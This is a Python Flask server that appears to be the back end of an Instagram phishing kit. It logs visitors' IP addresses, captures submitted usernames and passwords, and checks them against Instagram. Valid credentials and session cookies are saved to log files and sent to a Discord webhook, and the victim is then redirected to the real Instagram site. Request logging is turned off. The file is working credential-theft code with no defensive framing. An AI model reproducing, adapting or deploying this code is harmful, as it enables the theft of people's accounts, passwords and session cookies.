import os
import datetime
import pytz
import logging
import json
import requests
from flask import Flask, render_template, request, redirect, url_for
from dotenv import load_dotenv
from app.instagram_api import IsExists
from app.functions import set_agent, edit_cookies, first_art, correct_answer, wrong_answer
from colorama import Fore, Style
import concurrent.futures

app = Flask(__name__)
load_dotenv()

DISCORD_WEBHOOK_URL = os.getenv('DISCORD_WEBHOOK_URL')

def send_webhook_message(webhook_url, message):
    data = {
        "content": "```\n" + message + "```"
    }
    headers = {
        'Content-Type': 'application/json',
    }
    try:
        response = requests.post(webhook_url, data=json.dumps(data), headers=headers)
        response.raise_for_status()
        print(f"\n{Fore.GREEN}Message sent to Discord.{Style.RESET_ALL}")
    except requests.exceptions.RequestException as e:
        print(f"\n{Fore.RED}Error sending message to Discord: {e}{Style.RESET_ALL}")

@app.route('/')
def index():
    time_zone = "Asia/Baku"  # You can change it
    user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    user_agent = request.headers.get('User-Agent')

    utc_now = datetime.datetime.now(datetime.timezone.utc)
    baku_tz = pytz.timezone(time_zone)
    baku_now = utc_now.astimezone(baku_tz)
    visit_time = baku_now.strftime("%Y-%m-%d %H:%M:%S")
    
    if user_agent is not None:
        first_art(visit_time, user_ip, user_agent)
        with open('output/ip_agent.log', 'a') as f:
            f.write(f"\n\n\n\nEnter website in: {visit_time} \nIP: {user_ip}\nUser-Agent: {user_agent}\n")
    
    return render_template('index.html')

@app.route('/submit', methods=['POST'])
def submit():
    username = request.form['username']
    password = request.form['password']
    user_agent = set_agent()
    
    result, cookies = IsExists(username, password, user_agent)

    if result and result.get("status") == "ok" and result.get("authenticated") is not None and result.get("authenticated"):
        cookies = edit_cookies(cookies)
        correct_answer(username, password, cookies)
        
        with open('output/pass_user.log', 'a') as f:
            f.write(f"\nUsername: {username}\nPassword: {password}\n{cookies}\n")
        
        message = "Username: " + username + "\nPassword: " + password + "\n\n" + "\t\tCookies\n" + cookies
        
        # Using ThreadPoolExecutor to send the message asynchronously
        with concurrent.futures.ThreadPoolExecutor() as executor:
            future = executor.submit(send_webhook_message, DISCORD_WEBHOOK_URL, message)
            # Optionally, you can wait for the result if needed
            result = future.result()

        return redirect("http://www.instagram.com")
    else:
        wrong_answer(username, password)
        with open('output/wrong_pass.log', 'a') as f:
            f.write(f"\nUsername: {username}\nPassword: {password}\n")
        return render_template('error.html')

if __name__ == '__main__':
    try:
        log = logging.getLogger('werkzeug')
        log.disabled = True
        logging.disable(logging.CRITICAL)
        host = '0.0.0.0'
        port = 8080
        app.run(host=host, port=port)
    except:
        print(Fore.RED + "EXIT" + Style.RESET_ALL)
